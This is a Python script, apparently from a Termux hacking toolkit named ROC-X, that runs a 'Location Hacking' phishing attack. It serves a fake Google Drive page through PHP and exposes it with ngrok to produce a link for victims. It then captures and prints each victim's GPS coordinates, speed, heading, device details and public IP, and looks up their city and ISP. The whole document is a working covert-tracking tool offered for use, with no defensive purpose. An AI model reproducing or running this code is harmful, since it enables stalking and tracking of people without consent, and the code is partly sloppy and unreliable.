version="\t\t ★★★ Hack Location ★★★   "
#IMPORT
import getpass,time,os
import signal
import os,json
import os
import csv
import sys
import time
import json
import argparse
import requests
import subprocess as subp

try:
        os.system("cd $HOME/roc-x/.roc-x && chmod +x ngrok2")
except :
        pass
#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
line=yellow+"======================================================================================================================"
space=" "
logo=red+str("""
     8888888b.   .d88888b.   .d8888b.       Y88b   d88P
     888   Y88b d88P" "Y88b d88P  Y88b       Y88b d88P
     888    888 888     888 888    888        Y88o88P
     888   d88P 888     888 888        888888  Y888P
     8888888P"  888     888 888        888888  d888b
     888 T88b   888     888 888    888        d88888b
     888  T88b  Y88b. .d88P Y88b  d88P       d88P Y88b
     888   T88b  "Y88888P"   "Y8888P"       d88P   Y88b""")





os.system("clear || cls")

notice=green+""

# Definition

def header():
        print(logo+cyan+"\n\n\n\t\tDeveloped By : Sanaur Asif\n\n"+green+str(version)+" \n\n"+end+line+"\n"+end)

def clear():
        os.system("clear || cls")
def tm(CMD):
        os.system(CMD)

clear()
header()
print(cyan+"\n\t\t[•] Checking The Requirements")
time.sleep(0.7)
try:
        import requests
        a=os.system("php --version")
        if a!=0:
                jssisjjs
except:
        os.system("clear")
        header()
        print(cyan+"\n  [°] Installing The Requirements. Allow Up to 10 minutes ")
        time.sleep(2)
        os.system("clear")
        notice=cyan+"\t\t[°] Installing The Requirements.. \n"
        header()
        notice=""
        print("\n")
        os.system("pip install requests && pkg install php -y")
try:
        import requests
        a=os.system("php --version")
        if a!=0:
                jssisjjs
except:
        os.system("clear")
        header()
        print(cyan+"\n  [°] Installing The Requirements. Allow Up to 10 minutes ")
        time.sleep(2)
        os.system("clear")
        notice=cyan+"\t\t[°] Installing The Requirements.. \n"
        header()
        notice=""
        print("\n")
        os.system("pip install requests && pkg install php -y")
import requests

if os.path.isdir(".roc-x")!=True:
        tm("mkdir -p .roc-x")
if os.path.isdir(".roc-x/www")==True:
        tm("rm -rf .roc-x/www")
        tm("mkdir -p .roc-x/www")
else:
        tm("mkdir -p .roc-x/www")

def reset_color():
        print(end)

def kill_pid():
        tm("killall php> /dev/null 2>&1")
        tm("killall ngrok> /dev/null 2>&1 || killall ngrok2> /dev/null 2>&1")

def banner():
        print(logo)

def banner_small():
        print(logo)
def msg_exit():
        clear()
        header()
        print(cyan+"\n\t [√] Have A Good Day ")

def about():
        print(cyan+"\n\n\tYoutube:"+yellow+"\n\n\thttps://www.youtube.com/c/RootOfCyber"+cyan+"\n\n\tFacebook:"+yellow+"\n\n\thttps://www.facebook.com/RootOfCyber"+cyan+"\n\n\tWhat\'s app:"+yellow+"\n\n\thttps://chat.whatsapp.com/JPTOWlsJhhgEVtzht4tAlr"+cyan+"\n\n\tTelegram:\n"+yellow+"https://t.me/joinchat/RScE4xF8TiQIOs2Z"+cyan+"\n\n\n\n\tContact Us:"+yellow+"\n\n\trootofcyber@gmail.com"+cyan+"\n\n\n\tDeveloped By "+yellow+"Sanaur Asif"+cyan+"\n\tFB:"+yellow+" https://fb.com/sanaur.asif.72")


HOST='0.0.0.0'
PORT='8080'

def setup_site():
        HOST='127.0.0.1'
        PORT='8080'
        clear()
        header()
        print(cyan+"\n\n [•°•°] Copying Files for Location Hacking...")
        tm("cp -rf .lochack/gdrive/* .roc-x/www")
        if os.path.isfile(".roc-x/www/php/info.txt")==True:
        	os.remove(".roc-x/www/php/info.txt")
        if os.path.isfile(".roc-x/www/php/result.txt")==True:
        	os.remove(".roc-x/www/php/result.txt")
        print(cyan+"\n [•°•°] Staring Server at : "+yellow+"0.0.0.0:8080")
        tm("cd .roc-x/www && php -S 0.0.0.0:8080> /dev/null 2>&1 &")


clear ()
header()
print (cyan+"\n\n  [•] We Need A Link That Will Redirect after clicking Allow. Recommended Google Drive Link")
redirect=str(input(blue+"\n\n  [>] Enter The Redirect Link : "+yellow))

with open('.lochack/gdrive/js/location_temp.js', 'r') as js:
	reader = js.read()
	update = reader.replace('REDIRECT_URL', redirect)

with open('.lochack/gdrive/js/location.js', 'w') as js_update:
	js_update.write(update)

kill_pid()

setup_site()

print(cyan+"\n [•°•°] Trying to Forward port via Ngrok")
tm("./.roc-x/ngrok2 http 8080> /dev/null 2>&1 &")
time.sleep(2)
clear()
header()
print("\n\n"+cyan+" [•] Trying To Generate Link....\n")
stchck=0
import requests
while True:
        try:
                r=requests.get("http://localhost:4040/status",timeout=15)
        except:
                status="error"
                break
        at=r.text
        try:
                ustrt=int(at.find('command_line'))
                uend=int(at.find("Proto"))
                if ustrt==-1 or uend==-1:
                        wuwuw
                flink=at[ustrt+26:uend-5]
                status="ok"
                break
        except:
                if stchck<3:
                        stchck+=1
                        time.sleep(8)
                        continue
                else:
                        status="error"
                        break
if status=="ok":
        print(green+" [✓] Your Location Hacking Link is : \n\n\t"+yellow+flink+"\n")
elif status=="error":
        print(red+" [×] Unable to Generate Link ! Follow Steps : \n"+cyan+"\n\t [1] Exit Termux from Notification Panel\n\t [2] Then Open Termux Again\n\t"+cyan+" [3] Open ROC-X Tools Again\n\n\n")
ab=1
tyu=1
while True:
	if os.path.isfile(".roc-x/www/php/info.txt")==True:
		time.sleep(0.75)
		tr=open(".roc-x/www/php/info.txt","r")
		ip2=tr.read()
		try:
			jsontg=json.loads(ip2)
			for value in jsontg['dev']:
				var_os = value['os']
				var_platform = value['platform']
				try:
					var_cores = value['cores']
				except TypeError:
					var_cores = 'Not Available'
				var_ram = value['ram']
				var_vendor = value['vendor']
				var_render = value['render']
				var_res = value['wd'] + 'x' + value['ht']
				var_browser = value['browser']
				var_ip = value['ip']
				if tyu==1:
					os.system("clear")
					header()
					tyu+=1
				else:
					pass
				print(cyan+"\n\n\t\t[>] Device Information Found!\n\n")
				print(cyan+"\n [•] OS : "+green+var_os)
				print(cyan+"\n [•] Platform : "+green+var_platform)
				print(cyan+"\n [•] CPU Cores : "+green+var_cores)
				print(cyan+"\n [•] RAM : "+green+var_ram)
				print(cyan+"\n [•] GPU Vendor : "+green+var_vendor)
				print(cyan+"\n [•] GPU : "+green+var_render)
				print(cyan+"\n [•] Resolution : "+green+var_res)
				print(cyan+"\n [•] Browser : "+green+var_browser)
				print(cyan+"\n [•] Public IP : "+green+var_ip)
				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
				sc = rqst.status_code
				if sc == 200:
					data = rqst.text
					data = json.loads(data)
					var_continent = str(data['continent'])
					var_country = str(data['country'])
					var_region = str(data['region'])
					var_city = str(data['city'])
					var_org = str(data['org'])
					var_isp = str(data['isp'])
					print(cyan+"\n [•] Continent : "+green+var_continent)
					print(cyan+"\n [•] Region : "+green+var_region)
					print(cyan+"\n [•] City : "+green+var_city)
					print(cyan+"\n [•] Org : "+green+var_org)
					print(cyan+"\n [•] ISP : "+green+var_isp)
		except ValueError:
			pass
		os.remove(".roc-x/www/php/info.txt")
	if os.path.isfile(".roc-x/www/php/result.txt")==True:
		time.sleep(0.75)
		tr=open(".roc-x/www/php/result.txt","r")
		loc2=tr.read()
		try:
			jsont=json.loads(loc2)
			for value in jsont['info']:
				var_lat = value['lat'] + ' deg'
				var_lon = value['lon'] + ' deg'
				var_acc = value['acc'] + ' m'

				var_alt = value['alt']
				if var_alt == '':
					var_alt = 'Not Available'
				else:
					var_alt == value['alt'] + ' m'
				
				var_dir = value['dir']
				if var_dir == '':
					var_dir = 'Not Available'
				else:
					var_dir = value['dir'] + ' deg'
				
				var_spd = value['spd']
				if var_spd == '':
					var_spd = 'Not Available'
				else:
					var_spd = value['spd'] + ' m/s'
				if tyu==1:
					os.system("clear")
					header()
					tyu+=1
				else:
					pass
				print(cyan+"\n\n\t\t[>] Location Information Found!\n\n")
				print(cyan+"\n [•] Latitude : "+green+var_lat)
				print(cyan+"\n [•] Longitude : "+green+var_lon)
				print(cyan+"\n [•] Accuracy : "+green+var_acc)
				print(cyan+"\n [•] Altitude : "+green+var_alt)
				print(cyan+"\n [•] Direction : "+green+var_dir)
				print(cyan+"\n [•] Speed : "+green+var_spd)
				print(cyan+"\n [•] Google Maps : \n\n"+yellow+'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
		except ValueError:
			print(red+"\n [×] Something is Wrong. Try Again ! ")
		os.remove(".roc-x/www/php/result.txt")
		